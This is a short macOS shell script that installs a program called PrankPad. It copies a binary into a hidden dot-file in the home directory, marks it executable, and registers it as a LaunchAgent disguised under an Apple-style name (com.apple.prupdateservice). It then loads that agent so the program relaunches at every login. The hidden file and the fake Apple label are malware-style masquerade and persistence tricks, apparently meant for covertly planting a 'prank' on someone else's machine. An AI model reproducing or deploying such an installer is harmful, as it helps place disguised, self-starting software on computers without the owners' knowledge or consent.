#!/bin/sh

cp prupdateservice $HOME/.prupdateservice
chmod +x $HOME/.prupdateservice

mkdir -p $HOME/Library/LaunchAgents/

launchctl unload $HOME/Library/LaunchAgents/com.apple.prupdateservice.plist
cp com.apple.prupdateservice.plist $HOME/Library/LaunchAgents/
launchctl load $HOME/Library/LaunchAgents/com.apple.prupdateservice.plist

echo "PrankPad Successfully Installed"
